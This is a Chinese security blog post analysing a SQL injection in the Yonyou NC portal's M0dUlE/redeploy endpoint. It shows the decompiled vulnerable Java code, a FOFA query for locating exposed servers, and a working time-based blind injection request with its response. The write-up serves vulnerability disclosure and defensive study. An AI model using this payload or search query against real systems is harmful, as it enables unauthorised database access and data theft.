---
title: "用友NC M0dUlE/redeploy SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-nc-M0dUlE-redeploy-id-sqli.html
asset_dir: assets/用友nc-m0duleredeploy-sql注入漏洞
---

# 用友NC M0dUlE/redeploy SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/9 18:04
- 1260浏览
- [0评论](#comment)
- 31分钟阅读

深入探索

安全运维咨询

授权

代码安全审计

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)NC系统可利用redeploy传入的参数实现SQL注入，可窃取服务器敏感信息。

SQL注入防护

# 影响版本

NC63、NC633、NC65

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

根据官网漏洞通告，可知[sql注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)点为redeploy，通过搜索 redeploy 方法的定义即可找到所在文件

[![用友NC M0dUlE/redeploy SQL注入漏洞](images/img-001-40b64adda690.webp)](https://image.mrxn.net/aa740db2f53f4220822631a53e25329a.webp)

nc/uap/portal/action/PortalModuleManagerAction.class 文件

代码安全审计

```
package nc.uap.portal.action;

import java.io.File;
import java.io.IOException;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import nc.bs.framework.common.NCLocator;
import nc.bs.framework.common.RuntimeEnv;
import nc.uap.lfw.core.cache.ServiceCacheManger;
import nc.uap.lfw.core.crud.CRUDHelper;
import nc.uap.lfw.core.data.PaginationInfo;
import nc.uap.lfw.servletplus.annotation.Action;
import nc.uap.lfw.servletplus.annotation.Param;
import nc.uap.lfw.servletplus.annotation.Servlet;
import nc.uap.lfw.servletplus.core.impl.BaseAction;
import nc.uap.portal.deploy.PortalDeployer;
import nc.uap.portal.deploy.vo.PortalDeployDefinition;
import nc.uap.portal.log.PortalLogger;
import nc.uap.portal.service.PortalServiceUtil;
import nc.uap.portal.service.itf.IPortalDeployService;
import nc.uap.portal.util.ToolKit;
import nc.uap.portal.util.freemarker.FreeMarkerTools;
import nc.uap.portal.vo.PtModuleVO;
import nc.vo.ml.NCLangRes4VoTransl;
import org.apache.commons.io.FileUtils;

@Servlet(
    path = "/M0dUlE"
)
public class PortalModuleManagerAction extends BaseAction {
    public PortalModuleManagerAction() {
    }

@Action
public void redeploy(@Param(name = "id") String id) {
    if (!this.doCrc(id)) {
        this.print("CRC ERROR");
    }

    try {
        CRUDHelper.getCRUDService().executeUpdate("delete from pt_portlet where module = '" + id + "'");
        CRUDHelper.getCRUDService().executeUpdate("delete from pt_portalpage where module = '" + id + "'");
        CRUDHelper.getCRUDService().executeUpdate("DELETE FROM pt_preference WHERE portletname LIKE '" + id + ":%' OR pagename LIKE  '" + id + ":%' ");
    } catch (Exception e) {
        PortalLogger.error(e.getMessage(), e);
    }

    String portalModuleDir = RuntimeEnv.getInstance().getNCHome() + "/portalhome";
    File dir = new File(portalModuleDir + "/" + id);
    if (dir.exists()) {
        PortalDeployDefinition module = PortalServiceUtil.getPortalSpecService().parseModule(dir.getAbsolutePath());
        IPortalDeployService pds = (IPortalDeployService)NCLocator.getInstance().lookup(IPortalDeployService.class);
        pds.deployModule(module);
        ServiceCacheManger.notify("_portlets_cache", "group_portlets_cache");
    }

    this.print("redeploy : ok!");
}
```

虽然 `if (!this.doCrc(id)) {`有判断，但是仅仅打印错误，并没有终止进程，导致进入下一个逻辑后 `id` 直接拼接进SQL语句，造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)，还是这么朴实无华！

漏洞预警服务

# 漏洞复现

```
GET /portal/pt/M0dUlE/redeploy?id=1'AND+1=DBMS_PIPE.RECEIVE_MESSAGE(1,2)--&pageId=login HTTP/1.1
Host: nc65.mrxn.net

HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=xx.server; Path=/portal/; HttpOnly
X-UA-Compatible: IE=8,9,10
Content-Type: text/html; charset=UTF-8
Date: Thu, 10 Jan 2024 11:42:31 GMT
Content-Length: 23

CRC ERRORredeploy : ok!
```

[![用友NC M0dUlE/redeploy SQL注入漏洞](images/img-002-8d8a05203bcd.webp)](https://image.mrxn.net/5b16a94dba62402199a59916a6e1b353.webp)

Payload 成功延时3倍，延时6秒。

计算机服务器

# 参考

- `https://security.yonyou.com/#/noticeInfo?id=636`

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
